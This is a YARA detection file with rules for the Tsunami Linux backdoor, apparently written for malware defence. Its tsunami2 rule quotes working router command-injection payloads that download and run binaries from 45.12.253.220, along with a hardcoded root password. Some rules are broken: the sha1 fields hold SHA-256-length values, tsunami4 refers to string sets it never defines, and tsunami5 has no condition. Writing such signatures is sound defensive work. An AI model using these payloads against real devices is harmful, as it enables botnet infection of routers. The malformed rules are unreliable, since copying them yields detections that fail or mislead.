
rule tsunami1 {
    meta:
        description = "Tsunami malware - Linux backdoor that gives adversaries full control over infected systems"
        sha1 = "119bf47568c3d123945ac59dd978b178b7eeefa37c2d67f9b64d6cb56a7f583a"
        author = "Deirdre Murphy"

    strings:
        $s1 = "/proc/self/exe"
        $s2 = "\\x8f\\r\\n"
        $s3 = "hlLjztqZ"
        $s4 = "npxXoudifFeEgGaACScs"
        $s5 = "/dev/null"
        $s6 = "/proc/%d/exe"
        $s7 = "%d.%d.%d.%d"

        $useragent1 = "User-Agent: Wget/1.14.1"

    condition:
        all of them
}

rule tsunami2 {
    meta:
        description = "Tsunami malware - Linux backdoor that gives adversaries full control over infected systems"
        sha1 = "9a68f7b55a8346bee6e0304cdb097d5441a17229cd46d59fe69b8b5aa0edfce2"
        author = "Deirdre Murphy"

    strings:
        $u1 = "remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://45.12.253.220/busybox.a7;chmod+777+busybox.a7;./busybox.a7;rm+-rf+busybox.a7%3b%23&remoteSubmit=Save"
        $u2 = "&Host=;$(cd /tmp;wget http:/45.12.253.220/busybox.ms; chmod 777 busybox.ms; ./busybox.ms)&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit"
        $u3 = "GET /boaform/admin/formPing?target_addr=;cd /tmp; wget http://45.12.253.220/busybox.ms; chmod 777 busybox.ms; ./busybox.ms; rm -rf busybox.*; /&waninf=1_INTERNET_R_VID_154"
        $u4 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://45.12.253.220/hugeanalenema.sh+-O+/tmp/weeaboo;sh+/tmp/weeaboo;rm+/tmp/weeaboo`&ipv=0"
        $u5 = "SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://45.12.253.220/busybox.ms && chmod +x busybox.ms;./busybox.ms`"
        $u6 = "SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers"
        $u7 = "SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
        $u8 = "Frm_Logintoken=4&Username=root&Password=W%21n0%26oO7."
        $u9 = "%d.%d.%d.%d"

        $s2 = "BLACKNURSE"
        $s8 = "COMTREND"
        $s9 = "CROSSWEB"
        $s10 = "EXPLOITREP"
        $s11 = "HUAWEI"
        $s12 = "JAWS"
        $s13 = "NICK"

        $sh1 = "/bin/sh"
        $sh2 = "/dev/urandom"
        $sh3 = "/etc/rc.conf"
        $sh4 = "/etc/rc.d/rc.local"
        $sh5 = "/lib/ld-uClibc.so.0"
        $sh6 = "/proc"
        $sh7 = "/proc/%i/exe"
        $sh8 = "/proc/%ld/cmdline"
        $sh9 = "/proc/net/route"
        $sh10 = "/proc/self/exe"
        $sh11 = "/sbin/init"

        $useragent1 = "User-Agent: %s"
        $useragent2 = "User-Agent: BIGSKID"
        $useragent3 = "User-Agent: Hello, World"
        $useragent4 = "User-Agent: Hello-World"
        $useragent5 = "User-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)"
        $useragent6 = "User-Agent: Weeb/2.0"
        $useragent7 = "User-Agent: r00ts3c-owned-you"

    condition:
        all of ($s*) and all of ($u*) and 5 of ($sh*) and 1 of ($useragent*)
}

rule tsunami3 {
    meta:
        description = "Tsunami malware - Linux backdoor that gives adversaries full control over infected systems"
        sha1 = "bfc8c40a50c27a9b04d34fa84887a71e3672f5da9e5602506a137ae199a7638f"
        author = "Deirdre Murphy"

    strings:
        $u1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $u2 = "SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1"
        $u3 = "/anko-app/"
        $u4 = "/bin/busybox"
        $u5 = "/bin/sh"
        $u6 = "/cmdline"
        $u7 = "/dvr/"
        $u8 = "/etc/rc.conf"
        $u9 = "/etc/rc.d/rc.local"
        $u10 = "/proc/%d/cmdline" 
        $u11 = "/proc/%s/cmdline"
        $u12 = "/proc/%u/exe"
        $u13 = "/usr/lib/systemd/systemd"
        $u14 = "/usr/libexec/openssh/sftp-server"
        $u15 = "/usr/share/ipcam/"
        $u16 = "/var/Sofia"
        $u17 = "%d.%d.%d.%d"
        
        $s1 = "You name it they suck cockWhat am I doing with my life"
        $s2 = "9/11 was an inside job"
        $s3 = "FBI sucks cock"
        $s4 = "HIIYYOOOOOOO (Customgrow420)"
        $s5 = "Heyyy that's pretty gooood"
        $s6 = "STC is the greatest"

        $useragent1 = "User-Agent: %s"
        $useragent2 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
        $useragent3 = "User-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)"

    condition:
        all of ($u*) and all of ($s*) and 1 of ($useragent*)
}

rule tsunami4 {
    meta:
        description = "Tsunami malware - Linux backdoor that gives adversaries full control over infected systems"
        sha1 = "575a6853ac71adce6ea18952235dea77c8cc5a78dc13bbe2ef32ed6acbc0e400.danger"
        sha1 = "fcbf278fb235eb88c96991f92d7df0782fd20ffe9ebea59eb01fa8423d964489.danger"
        author = "Deirdre Murphy"

    strings:
        $s1 = "/usr/dict/words"
        $s2 = "%s : USERID : UNIX : %s"
        $s3 = "been_there_done_that"
        $s4 = "/etc/config/resolv.conf"
        $s5 = "NICK"
        
    condition:
        all of ($u*) and all of ($s*) and 1 of ($useragent*)
}

rule tsunami5 {
    meta:
        description = "Tsunami malware"
        sha1 = "bfac26ab02610df8fcd5715afdf8f6bfb0aad82206ea24bad6d6c7fc359f83b9.danger"
        author = "Deirdre Murphy"

    strings:
        $s1 = "/usr/dict/words"
        $s2 = "%s : USERID : UNIX : %s"
        $s3 = "TSUNAMI"
        $s4 = "/etc/resolv.conf"
        $s5 = "User-Agent: Mozilla/4.75 [en] (X11; U; Linux 2.2.16-3 i686)"
        $s6 = "posix_spawn_file_actions_destroy"
        $s7 = "posix_spawn_file_actions_adddup2"
        $s8 = "104.168.71.132"
}
